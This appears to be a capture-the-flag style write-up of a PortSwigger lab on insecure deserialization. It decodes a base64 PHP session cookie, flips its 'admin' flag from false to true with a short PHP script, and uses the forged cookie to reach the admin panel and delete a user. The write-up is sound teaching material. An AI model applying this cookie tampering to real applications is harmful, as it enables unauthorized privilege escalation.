# Modifying serialized objects

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow), you'll learn: Modifying serialized objects! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos's account.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-1/images/Pasted%20image%2020230110035303.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-1/images/Pasted%20image%2020230110035322.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-1/images/Pasted%20image%2020230110035339.png)

**When we successfully logged in, a new session cookie has been set:**

**URL decoded:**
```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=
```

As you can see, the last character is `=`, which is a padding character in base64!

**Let's base64 decode that:**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Insecure-Deserialization]
└─# echo -n 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=' | base64 -d
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

**As you can see, the decoded base64 string is a serialized PHP object!**

Let's break it down:

- `O:4:"User"` means there is an `User` object, and it's length is 4 characters long
- `2` means there are 2 attributes:
    - `s:8:"username"` means the **first attribute** is called `username`, and it's length is 8 characters long
        - `s:6:"wiener"` means `username` attribute value is `wiener`, and it's length is 6 characters long
    - `s:5:"admin"` means the **second attribute** is called `admin`, and it's length is 5 characters long
        - `b:0` means the `admin` attribute value is boolean value `0` (`false`)

**Armed with above information, we can write a PHP code to serialize and deserialize that PHP object:**
```php
<?php
    $deserializedObject = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}';

    $serializedObject = unserialize($deserializedObject);
    echo "[+] Serialized: \n";
    var_dump($serializedObject);
?>
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Insecure-Deserialization]
└─# php serialization.php
[+] Serialized: 
object(__PHP_Incomplete_Class)#1 (3) {
  ["__PHP_Incomplete_Class_Name"]=>
  string(4) "User"
  ["username"]=>
  string(6) "wiener"
  ["admin"]=>
  bool(false)
}
```

**Now, to gain administrator privilege, we can just change the `admin` attribute to `true` (`1`):**
```php
<?php
    $deserializedObject = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}';

    $serializedObject = unserialize($deserializedObject);
    echo "[+] Serialized: \n";
    var_dump($serializedObject);

    echo "[+] Base64 encoded: \n" . base64_encode($deserializedObject);
?>
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Insecure-Deserialization]
└─# php serialization.php 
[+] Serialized: 
object(__PHP_Incomplete_Class)#1 (3) {
  ["__PHP_Incomplete_Class_Name"]=>
  string(4) "User"
  ["username"]=>
  string(6) "wiener"
  ["admin"]=>
  bool(true)
}
[+] Base64 encoded: 
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=
```

**Let's change the session cookie with our newly created PHP serialized object in base64 encoded:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-1/images/Pasted%20image%2020230110041522.png)

**Then refresh the page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-1/images/Pasted%20image%2020230110041536.png)

We can access to the admin panel!

Let's delete user `carlos`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-1/images/Pasted%20image%2020230110041556.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-1/images/Pasted%20image%2020230110041607.png)

# What we've learned:

1. Modifying serialized objects